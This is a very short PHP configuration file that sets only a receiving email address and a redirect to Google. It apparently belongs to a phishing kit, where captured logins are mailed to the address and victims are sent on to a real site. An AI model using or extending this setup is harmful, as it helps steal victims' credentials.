<?php 
$Receive_email="mailboxk197@gmail.com";
$redirect="https://www.google.com/";
?>